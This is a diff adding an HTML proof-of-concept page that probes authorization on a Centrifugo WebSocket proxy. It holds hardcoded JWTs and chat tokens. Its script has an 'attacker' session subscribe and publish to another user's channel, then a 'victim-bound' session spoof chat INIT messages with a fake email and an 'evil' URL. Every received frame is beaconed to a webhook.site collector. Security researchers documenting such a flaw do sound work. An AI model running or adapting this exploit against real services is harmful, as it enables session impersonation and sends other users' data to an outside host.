@@ -1,0 +1,52 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>i071</title></head><body>
+<h1>i071 centrifugo authz probe</h1><pre id="log"></pre>
+<script>
+const T = {"A": {"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIwNDY4MDIyOWE1OTYwMDRjYjM0M2FjMTNlNjUwZDM0ZDI4NWU4MjE0Yjc2YzNiYjA1NjdjYjVhYzNjZjJmNjExOGU3ZDZiOGIzMmQ5MTNjYjZjNDY4NDFhYTFjMTFlZTJkM2RhNGJkMzYxNmYzZTdmMzc1YzlmZGUxMTc5MWE1NiIsImNoYW5uZWxzIjpbImNsaWVudF9wdWJsaXNoXzA0NjgwMjI5YTU5NjAwNGNiMzQzYWMxM2U2NTBkMzRkMjg1ZTgyMTRiNzZjM2JiMDU2N2NiNWFjM2NmMmY2MTE4ZTdkNmI4YjMyZDkxM2NiNmM0Njg0MWFhMWMxMWVlMmQzZGE0YmQzNjE2ZjNlN2YzNzVjOWZkZTExNzkxYTU2Il19.moPwFzs17Z8rt71u7frcQCQ8CANBM36tmeYKpmxl5eo", "channel": "client_publish_04680229a596004cb343ac13e650d34d285e8214b76c3bb0567cb5ac3cf2f6118e7d6b8b32d913cb6c46841aa1c11ee2d3da4bd3616f3e7f375c9fde11791a56", "chat_token": "04680229a596004cb343ac13e650d34d285e8214b76c3bb0567cb5ac3cf2f6118e7d6b8b32d913cb6c46841aa1c11ee2d3da4bd3616f3e7f375c9fde11791a56"}, "B": {"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI5OTRiMTFjOGYzMzNhNWIxYmVmOGY3NDQyOGIxOGUxY2FmMWJmN2U2NjBhYjMzMjJmMjc1MzE3YjMwMDM4Yzk5ZGU4ZDIwODQ1Y2QwMGNlZjY1Y2IzZTNmMzRiN2NlZDY4ZjkxZjU0YWNjMTZkYjdjNTU0ZjFiZWE4NTYwMjg0MCIsImNoYW5uZWxzIjpbImNsaWVudF9wdWJsaXNoXzk5NGIxMWM4ZjMzM2E1YjFiZWY4Zjc0NDI4YjE4ZTFjYWYxYmY3ZTY2MGFiMzMyMmYyNzUzMTdiMzAwMzhjOTlkZThkMjA4NDVjZDAwY2VmNjVjYjNlM2YzNGI3Y2VkNjhmOTFmNTRhY2MxNmRiN2M1NTRmMWJlYTg1NjAyODQwIl19.4_yzcV71yhFIjJ-v_Qh2ujhkcDyUYtr6yUB7JCK7598", "channel": "client_publish_994b11c8f333a5b1bef8f74428b18e1caf1bf7e660ab3322f275317b30038c99de8d20845cd00cef65cb3e3f34b7ced68f91f54acc16db7c554f1bea85602840", "chat_token": "994b11c8f333a5b1bef8f74428b18e1caf1bf7e660ab3322f275317b30038c99de8d20845cd00cef65cb3e3f34b7ced68f91f54acc16db7c554f1bea85602840"}, "V": {"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI5OTRiMTFjOGYzMzNhNWIxYmVmOGY3NDQyOGIxOGUxY2FmMWJmN2U2NjBhYjMzMjJmMjc1MzE3YjMwMDM4Yzk5ZGU4ZDIwODQ1Y2QwMGNlZjY1Y2IzZTNmMzRiN2NlZDY4ZjkxZjU0YWNjMTZkYjdjNTU0ZjFiZWE4NTYwMjg0MCIsImNoYW5uZWxzIjpbImNsaWVudF9wdWJsaXNoXzk5NGIxMWM4ZjMzM2E1YjFiZWY4Zjc0NDI4YjE4ZTFjYWYxYmY3ZTY2MGFiMzMyMmYyNzUzMTdiMzAwMzhjOTlkZThkMjA4NDVjZDAwY2VmNjVjYjNlM2YzNGI3Y2VkNjhmOTFmNTRhY2MxNmRiN2M1NTRmMWJlYTg1NjAyODQwIl19.4_yzcV71yhFIjJ-v_Qh2ujhkcDyUYtr6yUB7JCK7598", "channel": "client_publish_994b11c8f333a5b1bef8f74428b18e1caf1bf7e660ab3322f275317b30038c99de8d20845cd00cef65cb3e3f34b7ced68f91f54acc16db7c554f1bea85602840", "chat_token": "994b11c8f333a5b1bef8f74428b18e1caf1bf7e660ab3322f275317b30038c99de8d20845cd00cef65cb3e3f34b7ced68f91f54acc16db7c554f1bea85602840"}};
+const HOOK = "d829a8d4-18a5-4234-be47-2ae10ed815e4";
+const LOG = [];
+function esc(o){ return encodeURIComponent(JSON.stringify(o).slice(0,1400)); }
+function beacon(tag, data){ try{ fetch('https://webhook.site/'+HOOK+'?r='+esc({tag:tag,data:data}),{mode:'no-cors'}); }catch(e){} document.getElementById('log').textContent += tag+': '+JSON.stringify(data)+'\n'; }
+function rawws(name, jwt, script, watchCh){
+  return new Promise((resolve)=>{
+    const rec = {name:name, opened:false, frames:[], resolved:false};
+    let id = 0; const ws = new WebSocket('wss://centrifugo-proxy.tangem.org/connection/websocket');
+    const send = (o)=>{ id++; try{ ws.send(JSON.stringify(Object.assign({},o,{id:id}))); rec.frames.push(['S',id,JSON.stringify(o).slice(0,500)]);}catch(e){rec.frames.push(['SENDERR',id,String(e).slice(0,100)]);} };
+    ws.onopen = ()=>{ rec.opened = true; send({connect:{token:jwt, name:'js', version:'5.4.9'}}); };
+    ws.onmessage = (e)=>{ const s = String(e.data).slice(0,600); rec.frames.push(['R',null,s]); beacon(name+'_recv', s);
+      try{ const m = JSON.parse(e.data);
+        if(m.id && script.length){ const nxt = script.shift(); nxt(send); }
+      }catch(err){}
+    };
+    ws.onerror = ()=>rec.frames.push(['ERR',null,'ws error']);
+    ws.onclose = (ev)=>{ rec.frames.push(['CLOSE',null,'code='+ev.code]); if(!rec.resolved){rec.resolved=true; resolve(rec);} };
+    setTimeout(()=>{ try{ws.close()}catch(e){} }, 20000);
+  });
+}
+async function runAll(){
+  beacon('start', {tokens:'A,B,V'});
+  // B session first: connect and INIT its chat so victim session is live
+  const pB = rawws('B', T.B.token, [
+    (send)=> send({subscribe:{channel: T.B.channel}}),
+    (send)=> send({publish:{channel: T.B.channel, data:{type:'@@server/chat/INIT', company_id:'2_96', url:'https://tangem.com/', payload:{userData:{email:'i071-victim@example.com'}}, token: T.B.chat_token}}})
+  ]);
+  setTimeout(async ()=>{
+    // A session (attacker with OWN token only): cross-subscribe + cross-publish to B
+    const pA = await rawws('A', T.A.token, [
+      (send)=> send({subscribe:{channel: T.B.channel}}),
+      (send)=> send({publish:{channel: T.B.channel, data:{type:'@@server/chat/PULSE_ACTION', timestamp: 1, token: T.B.chat_token}}}),
+      (send)=> send({publish:{channel: T.A.channel, data:{type:'@@server/chat/PULSE_ACTION', timestamp: 2, token: T.B.chat_token}}})
+    ]);
+    beacon('A_done', pA.frames);
+    // V session (victim-bound token minted from B's chat_token): full impersonation
+    const pV = await rawws('V', T.V.token, [
+      (send)=> send({subscribe:{channel: T.B.channel}}),
+      (send)=> send({publish:{channel: T.B.channel, data:{type:'@@server/chat/INIT', company_id:'2_96', url:'https://evil-i071.example/', payload:{userData:{email:'spoofed-i071@example.com'}}, token: T.B.chat_token}}})
+    ]);
+    beacon('V_done', pV.frames);
+  }, 3000);
+  const doneB = await pB;
+  beacon('B_done', doneB.frames);
+  beacon('all_done', 'ok');
+}
+setTimeout(runAll, 1500);
+</script></body></html>
